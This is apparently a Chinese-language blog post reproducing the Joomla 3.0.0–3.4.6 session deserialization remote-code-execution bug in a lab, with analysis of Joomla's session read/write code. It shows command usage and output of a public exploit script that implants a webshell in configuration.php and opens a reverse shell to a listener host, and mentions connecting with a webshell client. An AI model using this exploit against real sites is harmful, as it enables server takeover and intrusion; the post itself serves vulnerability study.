---
title: Joomla3.4.6-RCE漏洞复现分析
date: 2019-10-10 09:59:37
toc: true
tags:
- Joomla3.0.0-3.4.5 RCE
categories:
- 漏洞复现
---

## Joomla 3.0.0-3.4.6 RCE 漏洞复现分析

### 前言

昨天就看到了许多安全媒体发布了Joomla RCE 漏洞的预警，一直到今天早上才有时间进行简单的复现和分析。

### 漏洞分析

主要是由于Joomla对于Session处理不当，可伪造Session，进行反序列化攻击。

### 环境搭建

Joomla 3.4.6 [下载地址](https://downloads.joomla.org/it/cms/joomla3/3-4-6)

Joomla-3.4.6-RCE.py [下载地址](https://github.com/momika233/Joomla-3.4.6-RCE/blob/master/Joomla-3.4.6-RCE.py)

### 漏洞验证

[![asciicast](https://asciinema.org/a/4lYL7w2oobX7diyORy09J0uqk.svg)](https://asciinema.org/a/4lYL7w2oobX7diyORy09J0uqk)

```shell
##验证漏洞是否存在，如果存在则输出Vulnerable
[shym]% python3 joomla-3.4.6-RCE.py -t http://192.168.2.164/
[*] Getting Session Cookie ..
[*] Getting CSRF Token ..
[*] Sending request ..
[+] Vulnerable
[*] Use --exploit to exploit it
[ShymdeMBP:joomla3.0.0-3.4.6]

##利用exp进行攻击：--explpit  监听主机地址：--lhost  监听主机端口：--lport 
[shym]% python3 joomla-3.4.6-RCE.py -t http://192.168.2.164/ --exploit --lhost 192.168.2.173 --lport 9001
[*] Getting Session Cookie ..
[*] Getting CSRF Token ..
[*] Sending request ..
[+] Vulnerable
[*] Getting Session Cookie ..
[*] Getting CSRF Token ..
[*] Sending request ..
[+] Backdoor implanted, eval your code at http://192.168.2.164//configuration.php ##成功挂马的地址
in a POST with 
jnyitzoezgaovqplmmjhjmjrvydzmiocrpxzpumwsihhhvozha ##随机生成的密码
[*] Now it's time to reverse, trying with a system + perl
```

成功利用后，会在/configuration.php插入一句话木马，如下图

![image](https://user-images.githubusercontent.com/38073810/66534820-0f669880-eb4a-11e9-8648-538849f5f646.png)

蚁剑成功连接

![image](https://user-images.githubusercontent.com/38073810/66534624-61f38500-eb49-11e9-95e7-ca6275582ae7.png)

### 简单分析

#### Session处理问题

Joomla改变了原本php对session的处理规则，导致在登录过程中，先执行write函数，再执行read函数。

```php
# libraries/joomla/session/storage/database.php
  /**
	 * Write session data to the SessionHandler backend.
	 *
	 * @param   string  $id    The session identifier.
	 * @param   string  $data  The session data.
	 *
	 * @return  boolean  True on success, false otherwise.
	 *
	 * @since   11.1
	 */
	public function write($id, $data)
	{
		// Get the database connection object and verify its connected.
		$db = JFactory::getDbo();

		$data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);

		try
		{
			$query = $db->getQuery(true)
				->update($db->quoteName('#__session'))
				->set($db->quoteName('data') . ' = ' . $db->quote($data))
				->set($db->quoteName('time') . ' = ' . $db->quote((int) time()))
				->where($db->quoteName('session_id') . ' = ' . $db->quote($id));

			// Try to update the session data in the database table.
			$db->setQuery($query);

			if (!$db->execute())
			{
				return false;
			}
			/* Since $db->execute did not throw an exception, so the query was successful.
			Either the data changed, or the data was identical.
			In either case we are done.
			*/
			return true;
		}
		catch (Exception $e)
		{
			return false;
		}
	}
```

```php
	/**
	 * Read the data for a particular session identifier from the SessionHandler backend.
	 *
	 * @param   string  $id  The session identifier.
	 *
	 * @return  string  The session data.
	 *
	 * @since   11.1
	 */
	public function read($id)
	{
		// Get the database connection object and verify its connected.
		$db = JFactory::getDbo();

		try
		{
			// Get the session data from the database table.
			$query = $db->getQuery(true)
				->select($db->quoteName('data'))
			->from($db->quoteName('#__session'))
			->where($db->quoteName('session_id') . ' = ' . $db->quote($id));

			$db->setQuery($query);

			$result = (string) $db->loadResult();

			$result = str_replace('\0\0\0', chr(0) . '*' . chr(0), $result);

			return $result;
		}
		catch (Exception $e)
		{
			return false;
		}
	}
```

 在上面write17行中，由于mysql无法处理null字节，所以在写入时将 `chr(0) . '*' . chr(0)`替换为`\0\0\0`，然而protected修饰的字段在序列化后含有`\x00\x2a\x00`，读取时，将字符替换还原，防止无法正常反序列化。如果写入数据库的时候，是`\0\0\0`， 取出来的时候将会变成`chr(0) . '*' . chr(0)`，入库时候生成的序列化数据长度为6`\0\0\0`，造成溢出，那么取出来的时候将会成为3`N*N`，反序列化时，如按照原先的长度读取，后续的字符将被吃掉。所以可以利用`\0\0\0`溢出，来逃逸密码。然后构造有效对象，发送exp，触发exp既可。......

### 漏洞修复

1、更新至最新版本